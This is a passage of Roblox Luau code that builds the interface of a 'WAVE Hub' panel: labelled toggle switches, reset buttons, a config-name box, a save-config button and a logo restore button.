G.WaveToggleDot_30.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_30.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_30.ZIndex = 8
G.WaveToggleDot_30.Parent = G.WaveTogglePill_30

G.UICorner_118 = Instance.new("UICorner")
G.UICorner_118.CornerRadius = UDim.new(0, 6)
G.UICorner_118.Parent = G.WaveToggleDot_30

G.TextButton_52 = Instance.new("TextButton")
G.TextButton_52.BackgroundTransparency = 1
G.TextButton_52.BorderSizePixel = 0
G.TextButton_52.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_52.ZIndex = 9
G.TextButton_52.Text = ""
G.TextButton_52.Parent = G.WaveTogglePill_30

G.Frame_126 = Instance.new("Frame")
G.Frame_126.BackgroundTransparency = 1
G.Frame_126.BorderSizePixel = 0
G.Frame_126.LayoutOrder = 111
G.Frame_126.Size = UDim2.new(1, 0, 0, 2)
G.Frame_126.Parent = G.WavePage_Interface

G.Frame_127 = Instance.new("Frame")
G.Frame_127.BackgroundTransparency = 1
G.Frame_127.BorderSizePixel = 0
G.Frame_127.LayoutOrder = 112
G.Frame_127.Size = UDim2.new(1, 0, 0, 2)
G.Frame_127.Parent = G.WavePage_Interface

G.Frame_128 = Instance.new("Frame")
G.Frame_128.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_128.BackgroundTransparency = 1
G.Frame_128.BorderSizePixel = 0
G.Frame_128.LayoutOrder = 101
G.Frame_128.Size = UDim2.new(1, 0, 0, 40)
G.Frame_128.Parent = G.WavePage_Interface

G.TextLabel_76 = Instance.new("TextLabel")
G.TextLabel_76.BackgroundTransparency = 1
G.TextLabel_76.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_76.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_76.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_76.Text = "Hide Buttons"
G.TextLabel_76.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_76.TextSize = 11
G.TextLabel_76.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_76.Parent = G.Frame_128

G.WaveTogglePill_31 = Instance.new("Frame")
G.WaveTogglePill_31.Name = "WaveTogglePill"
G.WaveTogglePill_31.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_31.BorderSizePixel = 0
G.WaveTogglePill_31.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_31.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_31.ZIndex = 7
G.WaveTogglePill_31:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_31.Parent = G.Frame_128

G.UICorner_119 = Instance.new("UICorner")
G.UICorner_119.CornerRadius = UDim.new(0, 9)
G.UICorner_119.Parent = G.WaveTogglePill_31

G.UIStroke_79 = Instance.new("UIStroke")
G.UIStroke_79.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_79.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_79.Parent = G.WaveTogglePill_31

G.WaveToggleDot_31 = Instance.new("Frame")
G.WaveToggleDot_31.Name = "WaveToggleDot"
G.WaveToggleDot_31.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_31.BorderSizePixel = 0
G.WaveToggleDot_31.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_31.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_31.ZIndex = 8
G.WaveToggleDot_31.Parent = G.WaveTogglePill_31

G.UICorner_120 = Instance.new("UICorner")
G.UICorner_120.CornerRadius = UDim.new(0, 6)
G.UICorner_120.Parent = G.WaveToggleDot_31

G.TextButton_53 = Instance.new("TextButton")
G.TextButton_53.BackgroundTransparency = 1
G.TextButton_53.BorderSizePixel = 0
G.TextButton_53.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_53.ZIndex = 9
G.TextButton_53.Text = ""
G.TextButton_53.Parent = G.WaveTogglePill_31

G.Frame_129 = Instance.new("Frame")
G.Frame_129.BackgroundTransparency = 1
G.Frame_129.BorderSizePixel = 0
G.Frame_129.LayoutOrder = 114
G.Frame_129.Size = UDim2.new(1, 0, 0, 2)
G.Frame_129.Parent = G.WavePage_Interface

G.Frame_130 = Instance.new("Frame")
G.Frame_130.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_130.BackgroundTransparency = 1
G.Frame_130.BorderSizePixel = 0
G.Frame_130.LayoutOrder = 102
G.Frame_130.Size = UDim2.new(1, 0, 0, 40)
G.Frame_130.Parent = G.WavePage_Interface

G.TextLabel_77 = Instance.new("TextLabel")
G.TextLabel_77.BackgroundTransparency = 1
G.TextLabel_77.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_77.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_77.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_77.Text = "Hide Button Panel"
G.TextLabel_77.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_77.TextSize = 11
G.TextLabel_77.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_77.Parent = G.Frame_130

G.WaveTogglePill_32 = Instance.new("Frame")
G.WaveTogglePill_32.Name = "WaveTogglePill"
G.WaveTogglePill_32.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_32.BorderSizePixel = 0
G.WaveTogglePill_32.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_32.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_32.ZIndex = 7
G.WaveTogglePill_32:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_32.Parent = G.Frame_130

G.UICorner_121 = Instance.new("UICorner")
G.UICorner_121.CornerRadius = UDim.new(0, 9)
G.UICorner_121.Parent = G.WaveTogglePill_32

G.UIStroke_80 = Instance.new("UIStroke")
G.UIStroke_80.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_80.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_80.Parent = G.WaveTogglePill_32

G.WaveToggleDot_32 = Instance.new("Frame")
G.WaveToggleDot_32.Name = "WaveToggleDot"
G.WaveToggleDot_32.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_32.BorderSizePixel = 0
G.WaveToggleDot_32.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_32.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_32.ZIndex = 8
G.WaveToggleDot_32.Parent = G.WaveTogglePill_32

G.UICorner_122 = Instance.new("UICorner")
G.UICorner_122.CornerRadius = UDim.new(0, 6)
G.UICorner_122.Parent = G.WaveToggleDot_32

G.TextButton_54 = Instance.new("TextButton")
G.TextButton_54.BackgroundTransparency = 1
G.TextButton_54.BorderSizePixel = 0
G.TextButton_54.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_54.ZIndex = 9
G.TextButton_54.Text = ""
G.TextButton_54.Parent = G.WaveTogglePill_32

G.Frame_131 = Instance.new("Frame")
G.Frame_131.BackgroundTransparency = 1
G.Frame_131.BorderSizePixel = 0
G.Frame_131.LayoutOrder = 116
G.Frame_131.Size = UDim2.new(1, 0, 0, 2)
G.Frame_131.Parent = G.WavePage_Interface

G.Frame_132 = Instance.new("Frame")
G.Frame_132.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_132.BackgroundTransparency = 1
G.Frame_132.BorderSizePixel = 0
G.Frame_132.LayoutOrder = 103
G.Frame_132.Size = UDim2.new(1, 0, 0, 40)
G.Frame_132.Parent = G.WavePage_Interface

G.TextLabel_78 = Instance.new("TextLabel")
G.TextLabel_78.BackgroundTransparency = 1
G.TextLabel_78.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_78.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_78.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_78.Text = "Unlock Button Panel"
G.TextLabel_78.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_78.TextSize = 11
G.TextLabel_78.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_78.Parent = G.Frame_132

G.WaveTogglePill_33 = Instance.new("Frame")
G.WaveTogglePill_33.Name = "WaveTogglePill"
G.WaveTogglePill_33.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_33.BorderSizePixel = 0
G.WaveTogglePill_33.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_33.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_33.ZIndex = 7
G.WaveTogglePill_33:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_33.Parent = G.Frame_132

G.UICorner_123 = Instance.new("UICorner")
G.UICorner_123.CornerRadius = UDim.new(0, 9)
G.UICorner_123.Parent = G.WaveTogglePill_33

G.UIStroke_81 = Instance.new("UIStroke")
G.UIStroke_81.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_81.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_81.Parent = G.WaveTogglePill_33

G.WaveToggleDot_33 = Instance.new("Frame")
G.WaveToggleDot_33.Name = "WaveToggleDot"
G.WaveToggleDot_33.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_33.BorderSizePixel = 0
G.WaveToggleDot_33.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_33.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_33.ZIndex = 8
G.WaveToggleDot_33.Parent = G.WaveTogglePill_33

G.UICorner_124 = Instance.new("UICorner")
G.UICorner_124.CornerRadius = UDim.new(0, 6)
G.UICorner_124.Parent = G.WaveToggleDot_33

G.TextButton_55 = Instance.new("TextButton")
G.TextButton_55.BackgroundTransparency = 1
G.TextButton_55.BorderSizePixel = 0
G.TextButton_55.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_55.ZIndex = 9
G.TextButton_55.Text = ""
G.TextButton_55.Parent = G.WaveTogglePill_33

G.Frame_133 = Instance.new("Frame")
G.Frame_133.BackgroundTransparency = 1
G.Frame_133.BorderSizePixel = 0
G.Frame_133.LayoutOrder = 118
G.Frame_133.Size = UDim2.new(1, 0, 0, 2)
G.Frame_133.Parent = G.WavePage_Interface

G.Frame_134 = Instance.new("Frame")
G.Frame_134.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_134.BackgroundTransparency = 1
G.Frame_134.BorderSizePixel = 0
G.Frame_134.LayoutOrder = 104
G.Frame_134.Size = UDim2.new(1, 0, 0, 40)
G.Frame_134.Parent = G.WavePage_Interface

G.TextLabel_79 = Instance.new("TextLabel")
G.TextLabel_79.BackgroundTransparency = 1
G.TextLabel_79.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_79.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_79.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_79.Text = "Unlock Buttons"
G.TextLabel_79.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_79.TextSize = 11
G.TextLabel_79.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_79.Parent = G.Frame_134

G.WaveTogglePill_34 = Instance.new("Frame")
G.WaveTogglePill_34.Name = "WaveTogglePill"
G.WaveTogglePill_34.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_34.BorderSizePixel = 0
G.WaveTogglePill_34.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_34.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_34.ZIndex = 7
G.WaveTogglePill_34:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_34.Parent = G.Frame_134

G.UICorner_125 = Instance.new("UICorner")
G.UICorner_125.CornerRadius = UDim.new(0, 9)
G.UICorner_125.Parent = G.WaveTogglePill_34

G.UIStroke_82 = Instance.new("UIStroke")
G.UIStroke_82.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_82.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_82.Parent = G.WaveTogglePill_34

G.WaveToggleDot_34 = Instance.new("Frame")
G.WaveToggleDot_34.Name = "WaveToggleDot"
G.WaveToggleDot_34.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_34.BorderSizePixel = 0
G.WaveToggleDot_34.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_34.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_34.ZIndex = 8
G.WaveToggleDot_34.Parent = G.WaveTogglePill_34

G.UICorner_126 = Instance.new("UICorner")
G.UICorner_126.CornerRadius = UDim.new(0, 6)
G.UICorner_126.Parent = G.WaveToggleDot_34

G.TextButton_56 = Instance.new("TextButton")
G.TextButton_56.BackgroundTransparency = 1
G.TextButton_56.BorderSizePixel = 0
G.TextButton_56.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_56.ZIndex = 9
G.TextButton_56.Text = ""
G.TextButton_56.Parent = G.WaveTogglePill_34

G.Frame_135 = Instance.new("Frame")
G.Frame_135.BackgroundTransparency = 1
G.Frame_135.BorderSizePixel = 0
G.Frame_135.LayoutOrder = 120
G.Frame_135.Size = UDim2.new(1, 0, 0, 2)
G.Frame_135.Parent = G.WavePage_Interface

G.Frame_136 = Instance.new("Frame")
G.Frame_136.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_136.BackgroundTransparency = 1
G.Frame_136.BorderSizePixel = 0
G.Frame_136.LayoutOrder = 8
G.Frame_136.Size = UDim2.new(1, 0, 0, 40)
G.Frame_136.Parent = G.WavePage_Interface

G.TextLabel_80 = Instance.new("TextLabel")
G.TextLabel_80.BackgroundTransparency = 1
G.TextLabel_80.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_80.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_80.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_80.Text = "Lock UI"
G.TextLabel_80.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_80.TextSize = 11
G.TextLabel_80.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_80.Parent = G.Frame_136

G.WaveTogglePill_35 = Instance.new("Frame")
G.WaveTogglePill_35.Name = "WaveTogglePill"
G.WaveTogglePill_35.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_35.BorderSizePixel = 0
G.WaveTogglePill_35.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_35.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_35.ZIndex = 7
G.WaveTogglePill_35:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_35.Parent = G.Frame_136

G.UICorner_127 = Instance.new("UICorner")
G.UICorner_127.CornerRadius = UDim.new(0, 9)
G.UICorner_127.Parent = G.WaveTogglePill_35

G.UIStroke_83 = Instance.new("UIStroke")
G.UIStroke_83.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_83.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_83.Parent = G.WaveTogglePill_35

G.WaveToggleDot_35 = Instance.new("Frame")
G.WaveToggleDot_35.Name = "WaveToggleDot"
G.WaveToggleDot_35.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_35.BorderSizePixel = 0
G.WaveToggleDot_35.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_35.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_35.ZIndex = 8
G.WaveToggleDot_35.Parent = G.WaveTogglePill_35

G.UICorner_128 = Instance.new("UICorner")
G.UICorner_128.CornerRadius = UDim.new(0, 6)
G.UICorner_128.Parent = G.WaveToggleDot_35

G.TextButton_57 = Instance.new("TextButton")
G.TextButton_57.BackgroundTransparency = 1
G.TextButton_57.BorderSizePixel = 0
G.TextButton_57.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_57.ZIndex = 9
G.TextButton_57.Text = ""
G.TextButton_57.Parent = G.WaveTogglePill_35

G.Frame_137 = Instance.new("Frame")
G.Frame_137.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_137.BackgroundTransparency = 1
G.Frame_137.BorderSizePixel = 0
G.Frame_137.LayoutOrder = 105
G.Frame_137.Size = UDim2.new(1, 0, 0, 34)
G.Frame_137.Parent = G.WavePage_Interface

G.TextLabel_81 = Instance.new("TextLabel")
G.TextLabel_81.BackgroundTransparency = 1
G.TextLabel_81.Position = UDim2.new(0, 12, 0.5, -7)
G.TextLabel_81.Size = UDim2.new(0, 100, 0, 14)
G.TextLabel_81.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_81.Text = "Reset Buttons"
G.TextLabel_81.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_81.TextSize = 11
G.TextLabel_81.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_81.Parent = G.Frame_137

G.TextButton_58 = Instance.new("TextButton")
G.TextButton_58.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.TextButton_58.BorderSizePixel = 0
G.TextButton_58.Position = UDim2.new(1, -88, 0.5, -13)
G.TextButton_58.Size = UDim2.new(0, 80, 0, 26)
G.TextButton_58.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_58.Text = "Reset"
G.TextButton_58.TextColor3 = Color3.fromRGB(185, 195, 215)
G.TextButton_58.TextSize = 11
G.TextButton_58.Parent = G.Frame_137

G.UICorner_129 = Instance.new("UICorner")
G.UICorner_129.CornerRadius = UDim.new(0, 4)
G.UICorner_129.Parent = G.TextButton_58

G.UIStroke_84 = Instance.new("UIStroke")
G.UIStroke_84.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_84.Color = Color3.fromRGB(20, 45, 90)
G.UIStroke_84.Parent = G.TextButton_58

G.Frame_138 = Instance.new("Frame")
G.Frame_138.BackgroundTransparency = 1
G.Frame_138.BorderSizePixel = 0
G.Frame_138.LayoutOrder = 123
G.Frame_138.Size = UDim2.new(1, 0, 0, 2)
G.Frame_138.Parent = G.WavePage_Interface

G.Frame_139 = Instance.new("Frame")
G.Frame_139.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_139.BackgroundTransparency = 1
G.Frame_139.BorderSizePixel = 0
G.Frame_139.LayoutOrder = 107
G.Frame_139.Size = UDim2.new(1, 0, 0, 34)
G.Frame_139.Parent = G.WavePage_Interface

G.TextLabel_82 = Instance.new("TextLabel")
G.TextLabel_82.BackgroundTransparency = 1
G.TextLabel_82.Position = UDim2.new(0, 12, 0.5, -7)
G.TextLabel_82.Size = UDim2.new(0, 100, 0, 14)
G.TextLabel_82.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_82.Text = "Reset Config"
G.TextLabel_82.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_82.TextSize = 11
G.TextLabel_82.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_82.Parent = G.Frame_139

G.TextButton_59 = Instance.new("TextButton")
G.TextButton_59.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.TextButton_59.BorderSizePixel = 0
G.TextButton_59.Position = UDim2.new(1, -88, 0.5, -13)
G.TextButton_59.Size = UDim2.new(0, 80, 0, 26)
G.TextButton_59.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_59.Text = "Reset"
G.TextButton_59.TextColor3 = Color3.fromRGB(185, 195, 215)
G.TextButton_59.TextSize = 11
G.TextButton_59.Parent = G.Frame_139

G.UICorner_130 = Instance.new("UICorner")
G.UICorner_130.CornerRadius = UDim.new(0, 4)
G.UICorner_130.Parent = G.TextButton_59

G.UIStroke_85 = Instance.new("UIStroke")
G.UIStroke_85.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_85.Color = Color3.fromRGB(20, 45, 90)
G.UIStroke_85.Parent = G.TextButton_59

G.Frame_140 = Instance.new("Frame")
G.Frame_140.BackgroundTransparency = 1
G.Frame_140.BorderSizePixel = 0
G.Frame_140.LayoutOrder = 125
G.Frame_140.Size = UDim2.new(1, 0, 0, 2)
G.Frame_140.Parent = G.WavePage_Interface

G.Frame_141 = Instance.new("Frame")
G.Frame_141.BackgroundTransparency = 1
G.Frame_141.BorderSizePixel = 0
G.Frame_141.LayoutOrder = 106
G.Frame_141.Size = UDim2.new(1, 0, 0, 28)
G.Frame_141.Parent = G.WavePage_Interface

G.TextLabel_83 = Instance.new("TextLabel")
G.TextLabel_83.BackgroundTransparency = 1
G.TextLabel_83.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_83.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_83.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_83.Text = "CONFIG"
G.TextLabel_83.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_83.TextSize = 13
G.TextLabel_83.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_83.Parent = G.Frame_141

G.Frame_142 = Instance.new("Frame")
G.Frame_142.BackgroundTransparency = 1
G.Frame_142.BorderSizePixel = 0
G.Frame_142.LayoutOrder = 127
G.Frame_142.Size = UDim2.new(1, 0, 0, 2)
G.Frame_142.Parent = G.WavePage_Interface

G.Frame_143 = Instance.new("Frame")
G.Frame_143.BackgroundTransparency = 1
G.Frame_143.BorderSizePixel = 0
G.Frame_143.LayoutOrder = 108
G.Frame_143.Size = UDim2.new(1, 0, 0, 34)
G.Frame_143.Parent = G.WavePage_Interface

G.Frame_144 = Instance.new("Frame")
G.Frame_144.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.Frame_144.BorderSizePixel = 0
G.Frame_144.Position = UDim2.new(0, 0, 0, 4)
G.Frame_144.Size = UDim2.new(1, 0, 0, 26)
G.Frame_144.Parent = G.Frame_143

G.UICorner_131 = Instance.new("UICorner")
G.UICorner_131.CornerRadius = UDim.new(0, 2)
G.UICorner_131.Parent = G.Frame_144

G.UIStroke_86 = Instance.new("UIStroke")
G.UIStroke_86.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_86.Color = Color3.fromRGB(18, 42, 85)
G.UIStroke_86.Parent = G.Frame_144

G.TextBox_15 = Instance.new("TextBox")
G.TextBox_15.BackgroundTransparency = 1
G.TextBox_15.Position = UDim2.new(0, 4, 0, 0)
G.TextBox_15.Size = UDim2.new(1, -8, 1, 0)
G.TextBox_15.ZIndex = 9
G.TextBox_15.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_15.Text = ""
G.TextBox_15.TextColor3 = Color3.fromRGB(220, 225, 235)
G.TextBox_15.TextSize = 11
G.TextBox_15.TextXAlignment = Enum.TextXAlignment.Left
G.TextBox_15.ClearTextOnFocus = false
G.TextBox_15.PlaceholderColor3 = Color3.fromRGB(28, 55, 100)
G.TextBox_15.PlaceholderText = "Config name..."
G.TextBox_15.Parent = G.Frame_144

G.Frame_145 = Instance.new("Frame")
G.Frame_145.BackgroundTransparency = 1
G.Frame_145.BorderSizePixel = 0
G.Frame_145.LayoutOrder = 129
G.Frame_145.Size = UDim2.new(1, 0, 0, 2)
G.Frame_145.Parent = G.WavePage_Interface

G.Frame_146 = Instance.new("Frame")
G.Frame_146.BackgroundTransparency = 1
G.Frame_146.BorderSizePixel = 0
G.Frame_146.LayoutOrder = 109
G.Frame_146.Size = UDim2.new(1, 0, 0, 34)
G.Frame_146.Parent = G.WavePage_Interface

G.TextButton_60 = Instance.new("TextButton")
G.TextButton_60.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.TextButton_60.BorderSizePixel = 0
G.TextButton_60.Position = UDim2.new(0, 0, 0, 3)
G.TextButton_60.Size = UDim2.new(1, 0, 0, 28)
G.TextButton_60.ZIndex = 9
G.TextButton_60.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_60.Text = "Save Config"
G.TextButton_60.TextColor3 = Color3.fromRGB(185, 195, 215)
G.TextButton_60.TextSize = 11
G.TextButton_60.Parent = G.Frame_146

G.UICorner_132 = Instance.new("UICorner")
G.UICorner_132.CornerRadius = UDim.new(0, 2)
G.UICorner_132.Parent = G.TextButton_60

G.UIStroke_87 = Instance.new("UIStroke")
G.UIStroke_87.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_87.Color = Color3.fromRGB(20, 45, 90)
G.UIStroke_87.Parent = G.TextButton_60

G.Frame_147 = Instance.new("Frame")
G.Frame_147.BackgroundTransparency = 1
G.Frame_147.BorderSizePixel = 0
G.Frame_147.LayoutOrder = 131
G.Frame_147.Size = UDim2.new(1, 0, 0, 2)
G.Frame_147.Parent = G.WavePage_Interface

G.Frame_148 = Instance.new("Frame")
G.Frame_148.AutomaticSize = Enum.AutomaticSize.Y
G.Frame_148.BackgroundTransparency = 1
G.Frame_148.BorderSizePixel = 0
G.Frame_148.LayoutOrder = 110
G.Frame_148.Size = UDim2.new(1, 0, 0, 0)
G.Frame_148.Parent = G.WavePage_Interface

G.UIListLayout_10 = Instance.new("UIListLayout")
G.UIListLayout_10.Padding = UDim.new(0, 4)
G.UIListLayout_10.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_10.Parent = G.Frame_148

G.EmptyLabel = Instance.new("TextLabel")
G.EmptyLabel.Name = "EmptyLabel"
G.EmptyLabel.BackgroundTransparency = 1
G.EmptyLabel.LayoutOrder = 1
G.EmptyLabel.Size = UDim2.new(1, 0, 0, 22)
G.EmptyLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.EmptyLabel.Text = "No configs saved yet."
G.EmptyLabel.TextColor3 = Color3.fromRGB(38, 80, 150)
G.EmptyLabel.TextSize = 10
G.EmptyLabel.Parent = G.Frame_148

G.Frame_149 = Instance.new("Frame")
G.Frame_149.BackgroundTransparency = 1
G.Frame_149.BorderSizePixel = 0
G.Frame_149.LayoutOrder = 133
G.Frame_149.Size = UDim2.new(1, 0, 0, 2)
G.Frame_149.Parent = G.WavePage_Interface

G.WaveMiniRestoreButton = Instance.new("ImageButton")
G.WaveMiniRestoreButton.Name = "WaveMiniRestoreButton"
G.WaveMiniRestoreButton.BackgroundTransparency = 1
G.WaveMiniRestoreButton.BorderSizePixel = 0
G.WaveMiniRestoreButton.Position = UDim2.new(0, 98, 0, 28)
G.WaveMiniRestoreButton.Size = UDim2.new(0, 64, 0, 64)
G.WaveMiniRestoreButton.ZIndex = 150
G.WaveMiniRestoreButton.Image = "rbxthumb://type=Asset&id=88821845971760&w=420&h=420"
G.WaveMiniRestoreButton.ScaleType = Enum.ScaleType.Fit
G.WaveMiniRestoreButton.Parent = G.WAVEHubV1

G.WAVEMiniRestoreScale = Instance.new("UIScale")
G.WAVEMiniRestoreScale.Name = "WAVEMiniRestoreScale"
G.WAVEMiniRestoreScale.Parent = G.WaveMiniRestoreButton

G.WaveMiniRestoreTitle = Instance.new("TextLabel")
G.WaveMiniRestoreTitle.Name = "WaveMiniRestoreTitle"
G.WaveMiniRestoreTitle.Active = true
G.WaveMiniRestoreTitle.BackgroundTransparency = 1
G.WaveMiniRestoreTitle.Position = UDim2.new(0, 82, 0, 90)
G.WaveMiniRestoreTitle.Size = UDim2.new(0, 96, 0, 18)
G.WaveMiniRestoreTitle.ZIndex = 150
G.WaveMiniRestoreTitle.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.WaveMiniRestoreTitle.Text = "WAVE"
G.WaveMiniRestoreTitle.TextColor3 = Color3.fromRGB(45, 130, 230)
G.WaveMiniRestoreTitle.TextSize = 16
G.WaveMiniRestoreTitle.Parent = G.WAVEHubV1

G.WAVEMiniRestoreLabelScale = Instance.new("UIScale")
G.WAVEMiniRestoreLabelScale.Name = "WAVEMiniRestoreLabelScale"
G.WAVEMiniRestoreLabelScale.Parent = G.WaveMiniRestoreTitle

G.WaveLogoPreloadHolder = Instance.new("Frame")
G.WaveLogoPreloadHolder.Name = "WaveLogoPreloadHolder"
G.WaveLogoPreloadHolder.BackgroundTransparency = 1
G.WaveLogoPreloadHolder.Position = UDim2.new(1, 20, 1, 20)
G.WaveLogoPreloadHolder.Size = UDim2.new(0, 1, 0, 1)
G.WaveLogoPreloadHolder.Visible = false
G.WaveLogoPreloadHolder.Parent = G.WAVEHubV1

G.LogoPreload_default = Instance.new("ImageLabel")
G.LogoPreload_default.Name = "LogoPreload_default"
G.LogoPreload_default.BackgroundTransparency = 1
G.LogoPreload_default.Size = UDim2.new(0, 64, 0, 64)
G.LogoPreload_default.Visible = false
G.LogoPreload_default.Image = "rbxthumb://type=Asset&id=88821845971760&w=420&h=420"
G.LogoPreload_default.Parent = G.WaveLogoPreloadHolder

G.LogoPreload_kira = Instance.new("ImageLabel")
